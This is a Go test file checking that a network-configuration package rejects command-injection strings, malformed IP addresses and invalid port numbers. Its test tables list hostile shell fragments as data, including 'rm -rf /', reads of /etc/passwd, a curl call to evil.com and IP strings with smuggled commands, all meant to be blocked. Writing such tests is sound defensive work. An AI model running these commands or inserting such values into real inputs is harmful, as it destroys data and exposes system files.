package security

import (
	"testing"

	"github.com/yourorg/gofakeip/pkg/netconfig"
)

// TestInputInjectionPrevention verifies command injection patterns are blocked
// per NON-NEGOTIABLE #4: NO VULNERABLE DEFAULTS
func TestInputInjectionPrevention(t *testing.T) {
	maliciousInputs := []string{
		"; rm -rf /",
		"| cat /etc/passwd",
		"&& whoami",
		"|| curl evil.com",
		"`whoami`",
		"$(id)",
		"\nwhoami",
		"\rwhoami",
		"test\x00whoami",
		"& whoami",
		"> /etc/passwd",
		"< /etc/passwd",
	}

	for _, input := range maliciousInputs {
		t.Run(input, func(t *testing.T) {
			if err := netconfig.ValidateCommandArg(input); err == nil {
				t.Errorf("ValidateCommandArg(%q) unexpectedly returned nil", input)
			}
		})
	}
}

func TestIPAddressValidation(t *testing.T) {
	tests := []struct{
		ip string
		wantErr bool
	}{
		{"192.168.1.1", false},
		{"2001:db8::1", false},
		{"192.168.1.1; rm -rf /", true},
		{"192.168.1.1 | whoami", true},
		{"999.999.999.999", true},
		{"", true},
	}
	for _, tt := range tests {
		err := netconfig.ValidateIP(tt.ip)
		if tt.wantErr && err == nil {
			t.Errorf("ValidateIP(%q) should have failed", tt.ip)
		}
		if !tt.wantErr && err != nil {
			t.Errorf("ValidateIP(%q) should have succeeded: %v", tt.ip, err)
		}
	}
}

func TestPortValidation(t *testing.T) {
	cases := []struct{ports []int; wantErr bool}{
		{[]int{80}, false},
		{[]int{80,443,8080}, false},
		{[]int{-1}, true},
		{[]int{65536}, true},
		{[]int{0}, true},
		{[]int{}, false},
	}
	for _, c := range cases {
		if err := netconfig.ValidatePorts(c.ports); (err != nil) != c.wantErr {
			t.Errorf("ValidatePorts(%v) error = %v, wantErr %v", c.ports, err, c.wantErr)
		}
	}
}

